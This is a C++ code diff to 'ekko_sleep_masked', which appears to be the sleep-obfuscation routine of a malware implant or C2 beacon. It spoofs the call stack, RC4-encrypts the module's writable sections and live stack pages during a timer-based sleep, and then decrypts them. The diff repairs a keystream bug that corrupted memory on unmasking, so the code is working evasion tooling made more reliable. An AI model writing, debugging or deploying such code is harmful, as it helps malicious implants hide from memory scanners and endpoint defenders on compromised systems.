@@ -199,13 +199,18 @@ inline void ekko_sleep_masked(DWORD sleepMs) {
     auto* st = new SpoofState();
     bool spoofed = spoof_stack(*st);
 
-    Rc4Context rc4;
-    rc4.init(key, sizeof(key));
+    // Two INDEPENDENT keystreams: `encrypt_sections` and the stack crypt
+    // consume different byte counts, so a single context would leave the
+    // two regions on different parts of one RC4 stream.
+    Rc4Context rc4_sec;
+    rc4_sec.init(key, sizeof(key));
+    Rc4Context rc4_stk;
+    rc4_stk.init(key, sizeof(key));
 
     // 5. MASK: RW sections of the module + the live stack pages.
     if (hModule)
-        encrypt_sections(reinterpret_cast<uint8_t*>(hModule), rc4);
-    rc4.crypt(stkLo, stkLen);
+        encrypt_sections(reinterpret_cast<uint8_t*>(hModule), rc4_sec);
+    rc4_stk.crypt(stkLo, stkLen);
 
     // 6. WAIT on a high-resolution timer (scheduler-invisible sleep).
     auto pCreateTimer = (PFN_NtCreateWaitableTimer)
@@ -243,10 +248,16 @@ inline void ekko_sleep_masked(DWORD sleepMs) {
     if (!usedTimer)
         Sleep(sleepMs);
 
-    // 7. UNMASK: RC4 self-inverse — same stream position for both crypts.
+    // 7. UNMASK: restart BOTH keystreams at position 0 with the same key.
+    //    RC4 is only self-inverse when the stream position matches: reusing
+    //    the mask-time contexts (the previous behaviour) decrypts from
+    //    wherever the stream stopped, which CORRUPTS the module's RW
+    //    sections and the live stack instead of restoring them.
+    rc4_sec.init(key, sizeof(key));
+    rc4_stk.init(key, sizeof(key));
     if (hModule)
-        encrypt_sections(reinterpret_cast<uint8_t*>(hModule), rc4);
-    rc4.crypt(stkLo, stkLen);
+        encrypt_sections(reinterpret_cast<uint8_t*>(hModule), rc4_sec);
+    rc4_stk.crypt(stkLo, stkLen);
 
     // 8. restore the real return chain, wipe key material, free heap state.
     if (spoofed)
